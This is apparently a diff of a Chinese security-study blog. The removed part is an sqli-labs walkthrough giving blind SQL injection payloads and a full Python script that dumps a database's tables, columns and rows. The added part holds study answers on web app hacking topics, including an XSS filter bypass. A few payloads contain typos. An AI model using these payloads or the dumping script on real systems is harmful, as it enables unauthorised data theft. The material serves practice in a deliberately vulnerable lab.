class="line"></span><br><span class="line">盲注需要掌握一些MySQL的相关函数：</span><br><span class="line">length(str)：返回str字符串的长度。   </span><br><span class="line"></span><br><span class="line">如执行select length(database())则会返回当前数据库名称的长度。而单独select database()则回返回当前数据库的名称。   </span><br><span class="line"></span><br><span class="line">substr(str, pos, len)：从pos位置取出str字符串的len个字符。如select substring(&apos;abcde&apos;, 4, 2)则返回de，pos为负则倒数pos个位置，如select substring(&apos;abcde&apos;, -4, 2);返回bc。    </span><br><span class="line"></span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line"></span><br><span class="line">ASCII(str)：返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。如select ASCII(&apos;a&apos;)返回97。  </span><br><span class="line"></span><br><span class="line">将上面几个函数组合一下就有布尔值出现。如Select ascii(substr(database(),2,1)) = 101;当database()即当前数据库的名称中，正数第二个字符为e，则会返回1，当为其他字符时会返回0。逐级替换2为其他数字，就可以逐字猜数据库名称了。其中的＝号还可以换成&lt;或者&gt;。  </span><br><span class="line"></span><br><span class="line">if ((exp1, exp2, exp3)：为条件判断语句。当exp1的值为true时候，返回exp2，否则返回exp3。如  select if ((select database())=&apos;secur&apos;,sleep(10),null)即为判断当当前数据库的名字为secur的时候，MySQL会休眠10秒。  </span><br><span class="line"></span><br><span class="line">MySQL的主要内置表和字段信息：  </span><br><span class="line"></span><br><span class="line">information_schema 库的 TABLES 表，  </span><br><span class="line">主要字段分别是：  </span><br><span class="line"></span><br><span class="line">TABLE_SCHEMA : 数据库名  </span><br><span class="line"></span><br><span class="line">TABLE_NAME：表名    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">盲注步骤：  </span><br><span class="line"></span><br><span class="line">(GET-盲注-布尔型-单引号)  </span><br><span class="line"></span><br><span class="line">1.构造SQL语句猜测当前数据库的名称：</span><br></pre></td></tr></table></figure></p>
-<p>../index.php?id=1’ and (ascii(substr((select database()),1,1))=115)–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">借助“&lt;”，“&gt;”进行二分法判断，逐渐缩小范围，改变字母的位置，猜对后逐渐扩大  </span><br><span class="line"></span><br><span class="line">2.猜出数据库名称后测试基于时间的盲注漏洞</span><br><span class="line">语句：</span><br></pre></td></tr></table></figure></p>
-<p>../index.php?id=1’ and if ((select database()=”security”),sleep(10),null)–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">若猜测正确，则会等待响应10秒钟  </span><br><span class="line"></span><br><span class="line">3.猜测表的数量：  </span><br><span class="line"></span><br><span class="line">语句：</span><br></pre></td></tr></table></figure></p>
-<p>../index.php?id=1’ and if(((select count(table_name) from information_schema,tables where table_schema=databaes())=4),sleep(10),null)–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line">4.构造语句猜测表名：</span><br></pre></td></tr></table></figure></p>
-<p>../index.php?id=1” and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),null)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">*构造语句中limit是mysql的语法  </span><br><span class="line"></span><br><span class="line">select * from tablename limit 0,1即取出第一条记录  </span><br><span class="line"></span><br><span class="line">select * from tablename limit 1,1取出第二条记录  </span><br><span class="line"></span><br><span class="line">select * from tablename limit 10,20从第11条到30条（共计20条）   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)   </span><br><span class="line"></span><br><span class="line">在这里，输入正确，返回结果是会出现You are in...，而其他情况则不出现，我们可以利用这一点来判断我们的输入来判断是否正确：  </span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/754A8219A7B947649D190348FB9ECA6B/6151)  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/4A86B85FD94549249C2AC59C360B83D3/6185)</span><br><span class="line"></span><br><span class="line">先来个猜测数据名的第一个字母作为示范：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;=110 %23  返回正确，说明第一个字母的ascii码大于110  </p>
-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;=118 %23  返回错误，说明一个字母的ascii码小于118，在区间110~118  </p>
-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;=114 %23  返回正确，说明一个字母的ascii码大于等于114，在区间114~118  </p>
-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;=116 %23  返回错误，说明第一个字母的ascii码小于116  </p>
-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr((select database()),1,1))&gt;=115 %23  返回正确，说明第一个字母的ascii码大于等于115，但小于116，说明该正确的ascii码为115，结果为’s’  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">上面就是布尔盲注的原理了，但是通过手工太消耗时间了，附上盲注脚本：</span><br></pre></td></tr></table></figure>
-<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import urllib</p>
-<p>search_str = “You are in”<br>database = “database()”<br>lengthdatabase = “‘ and length(%s)&gt;=%d #”<br>TableCountpayload = “‘and (select count(table_name) from information_schema.tables where table_schema=’%s’)&gt;=%d #”<br>asciiPayload = “‘ and ascii(substr((%s),%d,1))&gt;=%d #”</p>
-<p>selectdatabse = “select database()”<br>selectTable = “select table_name from information_schema.tables where table_schema=’%s’  limit %d,1”</p>
-<p>selectTableLength = “‘ and (select length(table_name) from information_schema.tables where table_schema=’%s’ limit “<br>selectTableLengthRight = “,1)&gt;=%d #”</p>
-<p>url = “<a href="http://localhost/sqli-labs/Less-8/?id=1&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&quot;</a></p>
-<p>def lengthString(payLoad, string):<br>    leftLenght = 0<br>    rightLenght = 0<br>    guess = 10<br>    while 1:<br>        if getLengthResult(payLoad, string, guess) == True:<br>            guess += 5<br>        else:<br>            rightLenght = guess<br>            break</p>
-<pre><code># print rightLenght
-mid = (leftLenght + rightLenght) / 2
-while leftLenght &lt; rightLenght - 1:
-    if getLengthResult(payLoad, string, mid) == True:
-        leftLenght = mid
-        mid = (leftLenght + rightLenght) / 2
-    else:
-        rightLenght = mid
-        mid = (leftLenght + rightLenght) / 2
-return leftLenght
-</code></pre><p>def getLengthResult(payLoad, string, Lenght):<br>    Finalurl = url + urllib.quote(payLoad % (string, Lenght))<br>    rs = urllib.urlopen(Finalurl)<br>    if search_str in rs.read():<br>        return True<br>    else:<br>        return False</p>
-<p>def getName(payload, string, Length):<br>    tmp = ‘’<br>    for i in xrange(1, Length + 1):<br>        leftLenght = 32<br>        rightLenght = 127<br>        mid = (leftLenght + rightLenght) / 2<br>        while leftLenght &lt; rightLenght - 1:<br>            if getResult(payload, string, i, mid) == True:<br>                leftLenght = mid<br>            else:<br>                rightLenght = mid<br>            mid = (leftLenght + rightLenght) / 2<br>        tmp += chr(leftLenght)</p>
-<pre><code># print tmp
-return tmp
-</code></pre><p>def getResult(payload, string, pos, ascii):<br>    Finalurl = url + urllib.quote(payload % (string, pos, ascii))<br>    rs = urllib.urlopen(Finalurl)<br>    if search_str in rs.read():<br>        return True<br>    else:<br>        return False</p>
-<p>def start():<br>    getDBLength = lengthString(lengthdatabase, database)<br>    print “length of DBname: “ + str(getDBLength)<br>    DBName = getName(asciiPayload, database, getDBLength)<br>    print “current database:” + DBName</p>
-<pre><code>print TableCountpayload
-tableCount = lengthString(TableCountpayload, DBName)
-print &quot;count of table: &quot; + str(tableCount)
+<h4 id="2-会话与会话令牌有何不同？"><a href="#2-会话与会话令牌有何不同？" class="headerlink" title="2.会话与会话令牌有何不同？"></a>2.会话与会话令牌有何不同？</h4><blockquote>
+<p>会话是服务器上保存的一组数据结构，用于追踪用户与应用程序交互的状态。会话令牌是应用程序为会话分配的一个特殊字符串，用户需要在连接提出请求的过程中提交该字符串，以重新确认自己的身份。</p>
+</blockquote>
+<h4 id="3-为何不可能始终使用基于白名单的方法进行输入确认？"><a href="#3-为何不可能始终使用基于白名单的方法进行输入确认？" class="headerlink" title="3.为何不可能始终使用基于白名单的方法进行输入确认？"></a>3.为何不可能始终使用基于白名单的方法进行输入确认？</h4><blockquote>
+<p>许多时候，应用程序可能会被迫接受与已知为“良性”输入的列表或模式不匹配的待处理数据。例如，许多用户的姓名包含可用在各种攻击中的字符。如果应用程序希望允许用户以真实姓名注册，就需要接受可能的恶意输入，并确保安全处理这些输入。</p>
+</blockquote>
+<h4 id="4-攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？"><a href="#4-攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？" class="headerlink" title="4.攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？"></a>4.攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？</h4><blockquote>
+<p>攻击者可以利用任何访问控制核心机制中的缺陷未授权访问管理功能。此外，攻击者以低权限用户身份提交的数据最终将向管理用户显示，因此，攻击者可以提交一些恶意数据，用于在管理用户查看这些数据时攻破他们的会话，从而对管理用户实施攻击。</p>
+</blockquote>
+<h4 id="5-旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入："><a href="#5-旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入：" class="headerlink" title="5.旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入："></a>5.旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(1) 删除任何出现的&lt;script&gt;表达式；</span><br><span class="line"></span><br><span class="line">(2) 将输入截短为50个字符；</span><br><span class="line"></span><br><span class="line">(3) 删除输入中的引号；</span><br><span class="line"></span><br><span class="line">(4) 对输入进行URL解码；</span><br><span class="line"></span><br><span class="line">(5) 如果任何输入项被删除，返回步骤(1)。</span><br><span class="line">是否能够避开上述确认机制，让以下数据通过确认？</span><br><span class="line">“&gt;&lt;script&gt;alert(“foo”)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>是。如果没有第4步，此机制将是可靠的，能够过滤其旨在阻止的特定项目。但是，由于输入在执行过滤步骤后被解码，攻击者只需要对有效载荷中的选定字符进行URL编码，就可以避开这种过滤：<br>“&gt;<br>如果首先执行第4步，或根本不执行该步骤，攻击者将不可能避开上述过滤。</p>
+</blockquote>
+<h3 id="第3章：Web应用程序技术"><a href="#第3章：Web应用程序技术" class="headerlink" title="第3章：Web应用程序技术"></a>第3章：Web应用程序技术</h3><h4 id="1-OPTIONS方法有什么作用？"><a href="#1-OPTIONS方法有什么作用？" class="headerlink" title="1.OPTIONS方法有什么作用？"></a>1.OPTIONS方法有什么作用？</h4><blockquote>
+<p>OPTIONS方法要求服务器报告可用于特定资源的HTTP方法。</p>
+</blockquote>
+<h4 id="2-If-Modified-Since和If-None-Match消息头的作用是什么？它们为何引起攻击者的兴趣？"><a href="#2-If-Modified-Since和If-None-Match消息头的作用是什么？它们为何引起攻击者的兴趣？" class="headerlink" title="2.If-Modified-Since和If-None-Match消息头的作用是什么？它们为何引起攻击者的兴趣？"></a>2.If-Modified-Since和If-None-Match消息头的作用是什么？它们为何引起攻击者的兴趣？</h4><blockquote>
+<p>If-Modified-Since消息头用于指定浏览器最后一次收到被请求的资源的时间。If-None-Match消息头用于指定实体标签，在最后一次收到被请求的资源时，服务器与被请求的资源一起发布该标签。<br>在上述两种情况下，这些消息头用于支持浏览器中的内容缓存，服务器通过它们指示浏览器使用资源的缓存副本，而非资源的完整内容（如果这样做没有必要）。<br>在攻击应用程序时，浏览器可能已经缓存了攻击者感兴趣的资源（如JavaScript文件）副本。如果删除这两个消息头，就可以覆写浏览器的缓存信息，确保服务器以攻击者希望查看的新的资源副本做出响应。</p>
+</blockquote>
+<h4 id="3-当服务器设置cookie时，secure标签有什么意义？"><a href="#3-当服务器设置cookie时，secure标签有什么意义？" class="headerlink" title="3.当服务器设置cookie时，secure标签有什么意义？"></a>3.当服务器设置cookie时，secure标签有什么意义？</h4><blockquote>
+<p>secure标签用于向浏览器发出以下指示：只应通过HTTPS连接、绝不能通过未加密的HTTP连接重新提交cookie。</p>
+</blockquote>
+<h4 id="4-常用状态码301与302有什么不同？"><a href="#4-常用状态码301与302有什么不同？" class="headerlink" title="4.常用状态码301与302有什么不同？"></a>4.常用状态码301与302有什么不同？</h4><blockquote>
+<p>301状态码告诉浏览器被请求的资源已永久移动到其他位置。在当前浏览器会话期间，如果浏览器需要访问最初请求的资源，它将使用在301响应中指定的位置。<br>302状态码告诉浏览器被请求的资源已临时移动到其他位置。下次浏览器需要访问最初请求的资源时，它将从最初请求的位置请求此资源。</p>
+</blockquote>
+<h4 id="5-使用SSL时，浏览器如何与Web代理实现互操作？"><a href="#5-使用SSL时，浏览器如何与Web代理实现互操作？" class="headerlink" title="5.使用SSL时，浏览器如何与Web代理实现互操作？"></a>5.使用SSL时，浏览器如何与Web代理实现互操作？</h4><blockquote>
+<p>浏览器向代理发送一个CONNECT请求，将目标主机名和端口号指定为此请求中的URL。如果代理允许该请求，它将返回一个状态码为200的HTTP响应，使TCP连接保持开放，并在随后作为指定目标的纯TCP级中继。</p>
+</blockquote>
+<h3 id="第4章：解析应用程序"><a href="#第4章：解析应用程序" class="headerlink" title="第4章：解析应用程序"></a>第4章：解析应用程序</h3><h4 id="1-当解析一个应用程序时，会遇到以下URL："><a href="#1-当解析一个应用程序时，会遇到以下URL：" class="headerlink" title="1.当解析一个应用程序时，会遇到以下URL："></a>1.当解析一个应用程序时，会遇到以下URL：</h4><blockquote>
+<p><a href="https://wahh-app.com/CookieAuth.dll?GetLogon?curl=Z2Fdefault.aspx" target="_blank" rel="noopener">https://wahh-app.com/CookieAuth.dll?GetLogon?curl=Z2Fdefault.aspx</a><br>据此可以推论出服务器使用何种技术？该技术的运作方式可能是怎样的？<br>文件名CookieAuth.dll说明应用程序正使用Microsoft ISA Server。这是登录功能的URL，成功登录后，应用程序将重定向到URL /default.aspx。</p>
+</blockquote>
+<h4 id="2-如果所针对的应用程序是一个Web论坛，并且只发现了一个URL：http-wahh-app-com-forums-ucp-php-mode-register如何通过它获得论坛成员列表？"><a href="#2-如果所针对的应用程序是一个Web论坛，并且只发现了一个URL：http-wahh-app-com-forums-ucp-php-mode-register如何通过它获得论坛成员列表？" class="headerlink" title="2.如果所针对的应用程序是一个Web论坛，并且只发现了一个URL：http://wahh-app.com/forums/ucp.php?mode=register如何通过它获得论坛成员列表？"></a>2.如果所针对的应用程序是一个Web论坛，并且只发现了一个URL：<a href="http://wahh-app.com/forums/ucp.php?mode=register如何通过它获得论坛成员列表？" target="_blank" rel="noopener">http://wahh-app.com/forums/ucp.php?mode=register如何通过它获得论坛成员列表？</a></h4><blockquote>
+<p>此URL是phpBB Web论坛软件的常用“指纹”。因特网上提供了有关此软件的大量信息，读者可以自己安装该软件以进行体验。可以通过以下URL获取成员列表：<br><a href="http://wahh-app.com/forums/memberlist.php" target="_blank" rel="noopener">http://wahh-app.com/forums/memberlist.php</a><br>通过类似于下面的URL可以获取单个用户的用户资料：<br><a href="http://wahh-app.com/forums/profile.php?mode=viewprofile&amp;u=2" target="_blank" rel="noopener">http://wahh-app.com/forums/profile.php?mode=viewprofile&amp;u=2</a><br>phpBB软件中包含各种漏洞，因此，读者应确认所使用的版本并研究任何相关问题。</p>
+</blockquote>
+<h4 id="3-当解析一个应用程序时，遇到以下URL：https-wahh-app-com-public-profile-Address-asp-action-view-amp-location-default-据此推断服务器端应使用何种技术。可能还存在哪些其他内容和功能？"><a href="#3-当解析一个应用程序时，遇到以下URL：https-wahh-app-com-public-profile-Address-asp-action-view-amp-location-default-据此推断服务器端应使用何种技术。可能还存在哪些其他内容和功能？" class="headerlink" title="3.当解析一个应用程序时，遇到以下URL：https://wahh-app.com/public/profile/Address.asp?action=view&amp;location=default 据此推断服务器端应使用何种技术。可能还存在哪些其他内容和功能？"></a>3.当解析一个应用程序时，遇到以下URL：<a href="https://wahh-app.com/public/profile/Address.asp?action=view&amp;location=default" target="_blank" rel="noopener">https://wahh-app.com/public/profile/Address.asp?action=view&amp;location=default</a> 据此推断服务器端应使用何种技术。可能还存在哪些其他内容和功能？</h4><blockquote>
+<p>.asp文件扩展名说明应用程序正使用Microsoft的Active Server Pages（ASP）。/public路径说明可能存在其他有用的路径，如/private。action=view参数表明可能存在其他操作，如edit、add或delete。应调查location=default参数的用途，其中可能包含用户名，因此应在应用程序中探查路径遍历漏洞。</p>
+</blockquote>
+<h4 id="4-Web服务器的一个响应包含以下消息头：Server-Apache-Coyote-1-1-这表示服务器使用何种技术？"><a href="#4-Web服务器的一个响应包含以下消息头：Server-Apache-Coyote-1-1-这表示服务器使用何种技术？" class="headerlink" title="4.Web服务器的一个响应包含以下消息头：Server:Apache-Coyote/1.1,这表示服务器使用何种技术？"></a>4.Web服务器的一个响应包含以下消息头：Server:Apache-Coyote/1.1,这表示服务器使用何种技术？</h4><blockquote>
+<p>如果该消息头是准确的，说明服务器正运行Apache Tomcat。Tomcat是一种Java Servlet容器，因此应用程序可能使用的是Java和JSP技术。</p>
+</blockquote>
+<h4 id="5-假设正在解析两个不同的Web应用程序，在每个应用程序中请求URL-admin-cpf。每个请求返回的响应消息头如下所示。仅由这些消息头能否确定每个应用程序中存在被请求的资源？"><a href="#5-假设正在解析两个不同的Web应用程序，在每个应用程序中请求URL-admin-cpf。每个请求返回的响应消息头如下所示。仅由这些消息头能否确定每个应用程序中存在被请求的资源？" class="headerlink" title="5.假设正在解析两个不同的Web应用程序，在每个应用程序中请求URL /admin.cpf。每个请求返回的响应消息头如下所示。仅由这些消息头能否确定每个应用程序中存在被请求的资源？"></a>5.假设正在解析两个不同的Web应用程序，在每个应用程序中请求URL /admin.cpf。每个请求返回的响应消息头如下所示。仅由这些消息头能否确定每个应用程序中存在被请求的资源？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Microsoft-IIS/5.0</span><br><span class="line">Expires: Mon, 20 Jun 2011 14:59:21 GMT</span><br><span class="line">Content-Location: http://wahh-</span><br><span class="line">app.com/includes/error.htm?404;http://wahh-app.com/admin.cpf</span><br><span class="line">Date: Mon, 20 Jun 2011 14:59:21 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 2117</span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">WWW-Authenticate: Basic realm=”Wahh Administration Site”</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 954</span><br><span class="line">Date: Mon, 20 Jun 2011 15:07:27 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>第一个响应使用HTTP状态码200，通常这表示请求已成功提交。但是，Content-Location消息头表示从中获取该响应的位置。这似乎是一个动态生成的错误页面，并且其查询字符串中包含值404，表明响应中包含定制的“文件未发现”消息。  </p>
+</blockquote>
+<blockquote>
+<p>第二个响应使用HTTP状态码401，表明被请求的资源存在，但用户必须提供HTTP验证证书才能访问该资源。  </p>
+</blockquote>
+<blockquote>
+<p>对于以上每一种情况，可以使用相同扩展名（如/iuwehuiwefuwedw.cpf）请求同一目录中的某个确定不存在的项目，并比较相关响应，以证实上述结论。第一个应用程序可能会返回与原始响应极其类似的响应。第二个应用程序可能会返回包含“文件未发现”消息的不同响应。</p>
+</blockquote>
+<h3 id="第5章：避开客户端控件"><a href="#第5章：避开客户端控件" class="headerlink" title="第5章：避开客户端控件"></a>第5章：避开客户端控件</h3><h4 id="1-通过客户端传送的数据如何阻止破坏性攻击？"><a href="#1-通过客户端传送的数据如何阻止破坏性攻击？" class="headerlink" title="1.通过客户端传送的数据如何阻止破坏性攻击？"></a>1.通过客户端传送的数据如何阻止破坏性攻击？</h4><blockquote>
+<p>可以使用保存在服务器上的密钥对数据进行加密或散列处理，就像选择性地使用ASP.NET ViewState一样。除非攻击者以某种方式获得密钥，否则他们将无法加密任意数据，或计算出任意数据的有效散列。但是，攻击者仍然能够将一种情形中的数据用于另一种情形——例如，可以用廉价商品的加密价格替代昂贵商品的加密价格。为防止这种攻击，应用程序应在受保护的数据中包含足够的上下文信息，以便于确认所采用的数据源自同一情形——例如，可以将产品代码和价格组合在一个加密对象中。</p>
+</blockquote>
+<h4 id="2-应用程序开发者希望阻止攻击者对登录功能发动蛮力攻击。由于攻击者可能以多个用户名为目标，开发者决定将登录尝试失败次数保存在一个加密cookie中，阻止任何失败次数超过5次的请求。有什么办法能够避开这种防御？"><a href="#2-应用程序开发者希望阻止攻击者对登录功能发动蛮力攻击。由于攻击者可能以多个用户名为目标，开发者决定将登录尝试失败次数保存在一个加密cookie中，阻止任何失败次数超过5次的请求。有什么办法能够避开这种防御？" class="headerlink" title="2.应用程序开发者希望阻止攻击者对登录功能发动蛮力攻击。由于攻击者可能以多个用户名为目标，开发者决定将登录尝试失败次数保存在一个加密cookie中，阻止任何失败次数超过5次的请求。有什么办法能够避开这种防御？"></a>2.应用程序开发者希望阻止攻击者对登录功能发动蛮力攻击。由于攻击者可能以多个用户名为目标，开发者决定将登录尝试失败次数保存在一个加密cookie中，阻止任何失败次数超过5次的请求。有什么办法能够避开这种防御？</h4><blockquote>
+<p>这种防御很容易突破。攻击者不需要提交跟踪登录尝试失败次数的cookie。他们可以在浏览器中禁用cookie，或使用自动化脚本不通过相关cookie提交请求。  </p>
+</blockquote>
+<blockquote>
+<p>其他防御措施包括使用CAPTCHA控件暂时阻止攻击者，或在登录失败次数达到五次后阻止源IP地址，但是，这样做可能会对使用代理或NAT防火墙的多个用户造成负面影响。</p>
+</blockquote>
+<h4 id="3-某应用程序包含一个执行严格访问控件的管理页面。该页面上有一个连接到另一台Web服务器的诊断功能链接。只有管理员才能够访问这些功能。不执行另一种验证机制，下列哪一种（如果有）客户端机制可用于为诊断功能提供安全的访问控件？要选择一个解决方案，是否还需要了解其他信息？"><a href="#3-某应用程序包含一个执行严格访问控件的管理页面。该页面上有一个连接到另一台Web服务器的诊断功能链接。只有管理员才能够访问这些功能。不执行另一种验证机制，下列哪一种（如果有）客户端机制可用于为诊断功能提供安全的访问控件？要选择一个解决方案，是否还需要了解其他信息？" class="headerlink" title="3.某应用程序包含一个执行严格访问控件的管理页面。该页面上有一个连接到另一台Web服务器的诊断功能链接。只有管理员才能够访问这些功能。不执行另一种验证机制，下列哪一种（如果有）客户端机制可用于为诊断功能提供安全的访问控件？要选择一个解决方案，是否还需要了解其他信息？"></a>3.某应用程序包含一个执行严格访问控件的管理页面。该页面上有一个连接到另一台Web服务器的诊断功能链接。只有管理员才能够访问这些功能。不执行另一种验证机制，下列哪一种（如果有）客户端机制可用于为诊断功能提供安全的访问控件？要选择一个解决方案，是否还需要了解其他信息？</h4><pre><code>(1) 诊断功能能够检查HTTP Referer消息头，证实请求由主管理页面提交。  
 
-for i in xrange(0, tableCount):
-    num = str(i)
-    selectTableLengthPayload = selectTableLength + num + selectTableLengthRight
-    tableNameLength = lengthString(selectTableLengthPayload, DBName)
-    #print &quot;current table length:&quot; + str(tableNameLength)
+(2) 诊断功能能够验证收到的cookie，证实其中包含访问主应用程序所需的有效会话令牌。  
 
-    selectTableName = selectTable % (DBName, i)
-    tableName = getName(asciiPayload, selectTableName, tableNameLength)
-    print tableName
-
-ColumnCountPayload = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;&quot; + DBName + &quot;&apos; and table_name=&apos;%s&apos;)&gt;=%d #&quot;
-getTable = raw_input(&quot;输入需要查询的列的表名：&quot;)
-# 获取指定表的列数量
-columnCount = lengthString(ColumnCountPayload, getTable)
-print &quot;table:&quot; + getTable + &quot;--count  of column:&quot; + str(columnCount)
-
-# 获取指定表的行数量
-dataCountPayload = &quot;&apos; and (select count(*) from %s)&gt;=%d #&quot;
-dataCount = lengthString(dataCountPayload, getTable)
-print &quot;table:&quot; + getTable + &quot;--count of data: &quot; + str(dataCount)
-
-data = []
-# 获取指定表中的列
-for i in xrange(0, columnCount):
-    columnLengthPayload = &quot;&apos; and (select length(column_name) from information_schema.columns where table_schema=&apos;&quot; + DBName + &quot;&apos; and table_name=&apos;%s&apos; limit &quot; + str(
-        i) + &quot;,1)&gt;=%d #&quot;
-    #print columnLengthPayload
-    columnNameLength = lengthString(columnLengthPayload, getTable)
-    #print &quot;current column length:&quot; + str(columnNameLength)
-    # 获取列名
-    selectColumn = &quot;select column_name from information_schema.columns where table_schema=&apos;&quot; + DBName + &quot;&apos; and table_name=&apos;%s&apos; limit %d,1&quot;
-    selectColumnName = selectColumn % (getTable, i)
-    #print selectColumnName
-    columnName = getName(asciiPayload, selectColumnName, columnNameLength)
-    print &quot;current column_name: &quot; + columnName
-
-    tmpData = []
-    tmpData.append(columnName)
-
-    for j in xrange(0, dataCount):
-        columnDataLengthPayload = &quot;&apos; and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;
-        #print columnDataLengthPayload
-        columnDataLength = lengthString(columnDataLengthPayload, getTable)
-       # print &quot;current columnData length: &quot; + str(columnDataLength)
-        selectData = &quot;select &quot; + columnName + &quot; from &quot; + getTable + &quot; limit &quot; + str(j) + &quot;,1&quot;
-        columnData = getName(asciiPayload, selectData, columnDataLength)
-        #print &quot;current columnData: &quot; + columnData
-        tmpData.append(columnData)
-
-    data.append(tmpData)
-
-
-tmp = &quot;&quot;
-for i in xrange(0, len(data)):
-    tmp += data[i][0] + &quot; &quot;
-print tmp
-
-for j in xrange(1, dataCount + 1):
-    tmp = &quot;&quot;
-    for i in xrange(0, len(data)):
-        tmp += data[i][j] + &quot; &quot;
-    print tmp
-</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    start()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获取到的结果为(代码输出完整的结果需要等一段时间哦）：  </span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/1A151F04731044FE9639A21C86CF96B3/6196)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less 9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)  </span><br><span class="line"></span><br><span class="line">给出payload语句：</span><br></pre></td></tr></table></figure>
-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and if(ascii(substr((select database()),1,1))=114,sleep(5),null) %23  错误  </p>
